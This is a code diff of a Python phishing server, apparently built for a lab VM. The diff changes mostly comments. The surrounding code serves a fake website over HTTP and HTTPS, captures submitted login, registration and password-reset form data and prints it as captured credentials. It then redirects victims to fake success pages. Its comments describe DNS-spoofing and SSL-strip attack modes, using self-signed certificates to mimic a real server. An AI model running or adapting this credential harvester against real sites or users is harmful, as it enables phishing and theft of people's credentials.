@@ -5,27 +5,25 @@ import threading
 import os
 import sys
 
-# --- CONFIGURATION ---
-SERVER_IP = "192.168.1.30"   # <--- Match your VM IP
+# Server Configuration
+SERVER_IP = "192.168.1.30"   
 PORT_HTTP = 80
 PORT_HTTPS = 443
 BASE_DIR = "pages"           
 SUCCESS_DIR = "success"
 
-# CHECK COMMAND LINE ARGUMENTS
-# If true, Port 80 will SERVE the site instead of REDIRECTING
+# Determine mode based on arguments:
+# --http present: Serve content on Port 80 (DNS Spoofing Mode)
+# --http missing: Redirect Port 80 to 443 (SSL Strip Mode)
 HTTP_ONLY_MODE = "--http" in sys.argv 
-# ---------------------
 
 def serve_content(handler):
-    """
-    Helper function to locate and serve files from the 'pages' folder.
-    Used by both HTTP and HTTPS handlers depending on mode.
-    """
+    """ Locates and serves files from the 'pages' directory. """
     if handler.path == '/': handler.path = '/index.html'
     
     clean_path = handler.path.lstrip('/')
     
+    # Route success pages to their specific subdirectory
     if "success" in clean_path:
         file_path = os.path.join(BASE_DIR, SUCCESS_DIR, os.path.basename(clean_path))
     else:
@@ -42,14 +40,13 @@ def serve_content(handler):
         handler.send_error(404, "File Not Found")
 
 def handle_post(handler, protocol_name):
-    """
-    Helper function to capture credentials and redirect to success page.
-    """
+    """ Captures POST data (credentials), logs it, and redirects the user. """
     try:
         length = int(handler.headers.get('Content-Length', 0))
         data = handler.rfile.read(length).decode('utf-8')
         print(f"\n[+] CAPTURED ({protocol_name}): {data}")
         
+        # Determine redirection based on the endpoint accessed
         if handler.path == '/register': redirect = '/register_success.html'
         elif handler.path == '/forgot': redirect = '/forgot_success.html'
         else: redirect = '/dashboard.html'
@@ -60,23 +57,19 @@ def handle_post(handler, protocol_name):
     except Exception as e:
         print(f"[!] POST Error: {e}")
 
-# --- HANDLERS ---
-
 class HTTPSRequestHandler(http.server.SimpleHTTPRequestHandler):
-    """ Always serves content securely on Port 443 """
+    """ secure handler: Always serves content directly. """
     def do_GET(self): serve_content(self)
     def do_POST(self): handle_post(self, "HTTPS")
 
 class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
-    """ 
-    Port 80 Handler. Behavior changes based on HTTP_ONLY_MODE flag.
-    """
+    """ Insecure handler: Behaved depends on attack mode. """
     def do_GET(self):
         if HTTP_ONLY_MODE:
-            # MODE: DNS SPOOFING (Serve content directly, no SSL)
+            # DNS Mode: Serve fake site directly
             serve_content(self)
         else:
-            # MODE: SSL STRIP (Force Redirect to HTTPS)
+            # SSL Strip Mode: Force redirect to HTTPS to mimic real server
             self.send_response(301)
             new_url = f"https://{SERVER_IP}{self.path}"
             self.send_header('Location', new_url)
@@ -85,18 +78,15 @@ class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         if HTTP_ONLY_MODE:
-            # MODE: DNS SPOOFING (Capture and show dashboard)
             handle_post(self, "HTTP")
         else:
-            # MODE: SSL STRIP (If raw POST hits here, redirect to HTTPS)
+            # Preserve POST method during redirect (307)
             self.send_response(307)
             new_url = f"https://{SERVER_IP}{self.path}"
             self.send_header('Location', new_url)
             self.end_headers()
 
     def log_message(self, format, *args): return
-
-# --- SERVER RUNNERS ---
 
 def run_http_server():
     socketserver.TCPServer.allow_reuse_address = True
@@ -109,6 +99,8 @@ def run_http_server():
 
 def run_https_server():
     if not os.path.exists("cert.pem"): return
+    
+    # Configure TLS context with self-signed certs
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain("cert.pem", "key.pem")
     
